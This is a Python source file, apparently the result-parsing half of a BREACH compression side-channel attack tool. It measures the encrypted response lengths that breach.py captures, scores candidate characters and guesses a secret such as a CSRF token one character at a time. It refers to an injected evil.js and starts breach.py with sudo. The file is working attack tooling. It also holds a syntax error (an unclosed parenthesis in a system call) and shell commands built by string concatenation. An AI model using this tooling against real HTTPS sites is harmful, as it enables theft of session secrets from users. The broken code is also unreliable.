from __future__ import division
from os import system, path
import datetime
import time
import argparse
import breach

def initialize():
    '''
    Initialize global constants.
    '''
    global point_system_serial, point_system_parallel
    point_system_serial = {1: 20, 2: 16, 3: 12, 4: 10, 5: 8, 6: 6, 7: 4, 8: 3, 9: 2, 10: 1}
    point_system_parallel = {0: 1}

def get_alphabet(request_args):
    '''
    Get the alphabet of the search strings.
    '''
    import hillclimbing

    return hillclimbing.create_request_file(request_args)

def init_temp_objects(alphabet):
    '''
    Initialize temporary dicts and lists.
    '''
    iterations = {}
    output_sum = {}
    for i in alphabet:
        iterations[i] = 0
        output_sum[i] = 0
    return iterations, output_sum

def create_dictionary_sample(output_dict, iter_dict):
    '''
    Create a dictionary of the sampled input.
    '''
    combined = {}
    for k, v in iter_dict.items():
        if v != 0:
            combined[k] = output_dict[k] / iter_dict[k]
    return combined

def sort_dictionary_values(in_dict, desc = False):
    '''
    Sort a dictionary by values.
    '''
    sorted_dict = [ (v,k) for k, v in in_dict.items() ]
    sorted_dict.sort(reverse=desc)
    return sorted_dict

def sort_dictionary(in_dict, desc = False):
    '''
    Sort a dictionary by keys.
    '''
    sorted_dict = [ (v,k) for v, k in in_dict.items() ]
    sorted_dict.sort(reverse=desc)
    return sorted_dict

def continue_parallel_division(args_dict, correct_alphabet):
    '''
    Continue parallel execution with the correct half of the previous alphabet.
    '''
    return get_alphabet({'alphabet': correct_alphabet, 'prefix': args_dict['prefix'], 'method': args_dict['method']})

def parse_input(args_dict):
    system("cp request.txt " + args_dict['wdir'])
    time.sleep(5)
    system('rm -f out*')

    alpha_types = args_dict['alpha_types']
    alphabet = args_dict['alphabet']
    pivot_length = args_dict['pivot_length']
    prefix = args_dict['prefix']
    latest_file = args_dict['latest_file']
    minimum_request_length = args_dict['minimum_request_length']
    method = args_dict['method']
    correct_val = args_dict['correct_val']
    sampling_ratio = args_dict['sampling_ratio']
    refresh_time = args_dict['refresh_time']

    if method == 'p' and correct_val:
        if correct_val in alphabet[0]:
            correct_val = alphabet[0]
        elif correct_val in alphabet[1]:
            correct_val = alphabet[1]
        else:
            correct_val = None
    point_system = point_system_parallel if method == 'p' else point_system_serial
    filename = '_'.join(alpha_types) + '_' + prefix
    while 1:
        iterations, output_sum = init_temp_objects(alphabet)
        samples = {}
        points = {}
        for key, value in iterations.items():
            points[key] = 0

        result_file = open("result_" + filename, "w")
        if correct_val:
            result_file.write("Correct value = %s\n\n" % correct_val)
        result_file.write("Combined output files\n\n")
        system('cp out.out out_' + filename + '_' + str(latest_file + 1))
        out_iterator = "0"
        total_requests = 0
        with open("parsed_output.log", "w") as f:
            while int(out_iterator) < 100:
                try:
                    output_file = open('out_' + filename + '_' + out_iterator, "r")
                    result_file.write('out_' + filename + '_' + out_iterator + "\n")

                    prev_request = 0
                    curr_request = 0
                    buff = []
                    request_buff = []
                    found_first_req = False
                    found_response_packet = False
                    grab_next = False
                    for line in output_file.readlines():
                        if prev_request % len(alphabet) == 0:
                            for r in buff:
                                f.write(r)
                                total_requests = total_requests + 1
                            buff = []
                        if line.find(":") < 0:
                            continue
                        pref, size = line.split(": ")
                        if minimum_request_length:
                            if pref == "User application payload" and int(size) > minimum_request_length:
                                if not found_first_req:
                                    found_first_req = True
                                    request_buff = []
                                    continue
                                for packet in request_buff:
                                    pref, size = packet.split(": ")
                                    if (pref == "Endpoint application payload"):
                                        if grab_next:
                                            grab_next = False
                                            summary = int(size)
                                            buff.append("%d: %d\n" % (prev_request, summary))
                                            prev_request = prev_request + 1
                                            found_response_packet = True
                                        if int(size) > pivot_length - 15 and int(size) < pivot_length + 15:
                                            grab_next = True
                                if found_response_packet:
                                    found_response_packet = False
                                else:
                                    buff.append("%d: -1\n" % prev_request)
                                    prev_request = prev_request + 1
                                request_buff = []
                            else:
                                request_buff.append(line.strip())
                        else:
                            if (pref == "Endpoint application payload"):
                                if grab_next:
                                    grab_next = False
                                    summary = int(size) + prev_size
                                    buff.append("%d: %d\n" % (prev_request, summary))
                                    prev_request = prev_request + 1
                                if int(size) > pivot_length - 10 and int(size) < pivot_length + 10:
                                    grab_next = True
                                    continue
                                prev_size = int(size)

                    output_file.close()
                    out_iterator = str(int(out_iterator) + 1)
                    f.write("-1: -2\n")
                except Exception as e:
                    #print e
                    break

        total_requests = total_requests / len(alphabet)
        with open("parsed_output.log", "r") as f:
            alpha_counter = 0
            for parsed_line in f.readlines():
                it, sz = parsed_line.split(": ")
                if int(sz) == -2:
                    alpha_counter = 0
                    continue
                if int(sz) > 0:
                    output_sum[alphabet[alpha_counter]] = output_sum[alphabet[alpha_counter]] + int(sz)
                    iterations[alphabet[alpha_counter]] = iterations[alphabet[alpha_counter]] + 1
                alpha_counter = alpha_counter + 1
                if alpha_counter > len(alphabet) - 1:
                    alpha_counter = 0
                    sample = create_dictionary_sample(output_sum, iterations)
                    sorted_sample = sort_dictionary_values(sample)
                    samples[iterations[alphabet[alpha_counter]]] = sorted_sample
        result_file.write("\n")
        result_file.write("Combined sorted results\n")

        combined = create_dictionary_sample(output_sum, iterations)
        combined_sorted = sort_dictionary_values(combined)
        samples[iterations[alphabet[0]]] = combined_sorted
        samples = sort_dictionary(samples)
        if correct_val:
            result_file.write("\n")
            found_in_iter = False
            correct_leader = False
            result_file.write("\n")
            result_file.write("Iteration - Length Chart - Divergence from top - Points Chart - Points\n\n")
            for sample in samples:
                pos = 1
                for j in sample[1]:
                    if correct_leader:
                        divergence = j[0] - correct_len
                        correct_leader = False
                    if j[1] == correct_val:
                        correct_pos = pos
                        correct_len = j[0]
                        if pos == 1:
                            correct_leader = True
                        else:
                            divergence = leader_len - j[0]
                        found_in_iter = True
                    else:
                        if pos == 1:
                            leader_len = j[0]
                    if pos in point_system and sample[0]:
                        if iterations[alphabet[0]] > args_dict['iterations']/2:
                            points[j[1]] = points[j[1]] + 2 * point_system[pos]
                        else:
                            points[j[1]] = points[j[1]] + point_system[pos]
                    pos = pos + 1
                if sample[0] % sampling_ratio == 0 or sample[0] > len(samples) - 10:
                    if not found_in_iter:
                        result_file.write("%d\t%d\t%d\t%d\t%d\n" % (0, 0, 0, 0, 0))
                    else:
                        points_chart = sort_dictionary_values(points, True)
                        for position in enumerate(points_chart):
                            if position[1][1] == correct_val:
                                correct_position_chart = position[0] + 1
                                if position[0] == 0:
                                    diff = position[1][0] - points_chart[1][0]
                                else:
                                    diff = position[1][0] - points_chart[0][0]
                        result_file.write("%d\t\t%d\t\t%f\t\t%d\t%d\n" % (sample[0], correct_pos, divergence, correct_position_chart, diff))
            points = sort_dictionary_values(points, True)
            result_file.write("\n")
        else:
            for sample in samples:
                for j in enumerate(sample[1]):
                    if j[0] in point_system and sample[0]:
                        if iterations[alphabet[0]] > args_dict['iterations']/2:
                            points[j[1][1]] = points[j[1][1]] + 2 * point_system[j[0]]
                        else:
                            points[j[1][1]] = points[j[1][1]] + point_system[j[0]]
            result_file.write("\n")
            result_file.write("Iteration %d\n\n" % iterations[alphabet[0]])
            if method == 's':
                result_file.write("Correct Value is '%s' with divergence %f from second best.\n" % (combined_sorted[0][1], combined_sorted[1][0] - combined_sorted[0][0]))
        if method == 's':
            for symbol in enumerate(combined_sorted):
                if symbol[0] % 6 == 0:
                    result_file.write('\n')
                result_file.write("%s %f\t" % (symbol[1][1], symbol[1][0]))
        elif method == 'p':
            for symbol in enumerate(combined_sorted):
                if symbol[0] == 0: # TODO: Better calculation of correct alphabet
                    correct_alphabet = symbol[1][1].split(prefix)
                    correct_alphabet.pop(0)
                    for i in enumerate(correct_alphabet):
                        correct_alphabet[i[0]] = i[1].split()[0]
                result_file.write("%s \nLength: %f\nPoints: %d\n\n" % (symbol[1][1], symbol[1][0], points[symbol[1][1]]))
        if method == 's':
            result_file.write("\n")
            for symbol in enumerate(points):
                if symbol[0] % 10 == 0:
                    result_file.write('\n')
                result_file.write("%s %d\t" % (symbol[1], symbol[0]))
        result_file.write('\n')
        result_file.close()
        system("cat result_" + filename)
        system("rm parsed_output.log")
        time.sleep(refresh_time)
        if iterations[alphabet[0]] >= args_dict['iterations']:
            system('cp out_' + filename + ' history_out_' + filename
            if len(correct_alphabet) == 1:
                args_dict['prefix'] = args_dict['prefix'] + correct_alphabet[0]
                args_dict['alphabet']= get_alphabet({'alpha_types': args_dict['alpha_types'], 'prefix': args_dict['prefix'], 'method': args_dict['method']})
            else:
                args_dict['alphabet'] = continue_parallel_division(args_dict, correct_alphabet)
            parse_input(args_dict)
            break

def parse_args():
    '''
    Parse command line arguments.
    '''
    parser = argparse.ArgumentParser(description='Parser of breach.py output')
    parser.add_argument('-a', '--alpha_types', metavar = 'alphabet', required = True, nargs = '+', help = 'Choose alphabet types: n => digits, l => lowercase letters, u => uppercase letters, d => - and _')
    parser.add_argument('-l', '--len_pivot', metavar = 'pivot_length', required = True, type = int, help = 'Input the (observed payload) length value of the pivot packet')
    parser.add_argument('-p', '--prefix', metavar = 'bootstrap_prefix', required = True, help = 'Input the already known prefix needed for bootstrap')
    parser.add_argument('-m', '--method', metavar = 'request_method', help = 'Choose the request method: s => serial, p => parallel')
    parser.add_argument('-lf', '--latest_file', metavar = 'latest_file_number', type = int, help = 'Input the latest output file breach.py has created, -1 if first try')
    parser.add_argument('-r', '--request_len', metavar = 'minimum_request_length', type = int, help = 'Input the minimum length of the request packet')
    parser.add_argument('-c', '--correct', metavar = 'correct_value', help = 'Input the correct value we attack')
    parser.add_argument('-s', '--sample', metavar = 'sample', type = int, help = 'Input the sampling ratio')
    parser.add_argument('-i', '--iterations', metavar = 'number_of_iterations', type = int, help = 'Input the number of iterations per symbol.')
    parser.add_argument('-t', '--refresh_time', metavar = 'refresh_time', type = int, help = 'Input the refresh time in seconds')
    parser.add_argument('--wdir', metavar = 'web_application_directory', help = 'The directory where you have added evil.js')
    parser.add_argument('--execute_breach', action = 'store_true', help = 'Initiate breach attack via breach.py')
    args = parser.parse_args()

    args_dict = {}
    args_dict['alpha_types'] = args.alpha_types
    args_dict['alphabet']= get_alphabet({'alpha_types': args.alpha_types, 'prefix': args.prefix, 'method': args.method})
    args_dict['pivot_length'] = args.len_pivot
    args_dict['prefix'] = args.prefix
    args_dict['method'] = args.method if args.method else 's'
    args_dict['minimum_request_length'] = args.request_len if args.request_len else None
    args_dict['correct_val'] = args.correct if args.correct else None
    args_dict['sampling_ratio'] = args.sample if args.sample else 200000000
    args_dict['iterations'] = args.iterations if args.iterations else 500
    args_dict['refresh_time'] = args.refresh_time if args.refresh_time else 60
    args_dict['latest_file'] = args.latest_file if args.latest_file >= 0 else -1
    args_dict['wdir'] = args.wdir if args.wdir else '/var/www/breach'
    args_dict['execute_breach'] = True if args.execute_breach else False
    if path.isfile('out_' + '_'.join(args_dict['alpha_types']) + '_' + args_dict['prefix'] + '_' + str(args_dict['latest_file'] + 1)):
        raw = raw_input("Are you sure you want to overwrite file " + 'out_' + '_'.join(args_dict['alpha_types']) + '_' + args_dict['prefix'] + '_' + str(args_dict['latest_file'] + 1) + "'? ")
        assert raw == 'y' or raw == 'yes', "Aborted by user input"
    return args_dict

if __name__ == "__main__":
    initialize()
    args_dict = parse_args()
    if args_dict['execute_breach']:
        # NOTE: Run breach.py on background. Don't forget to kill it after you close parse.py!
        system('sudo python breach.py --silent -a ' + ' '.join(args_dict['alpha_types']) + ' -p '+ args_dict['prefix'] + ' -m ' + args_dict['method'] + ' --wdir ' + args_dict['wdir'] + ' &')
    parse_input(args_dict)
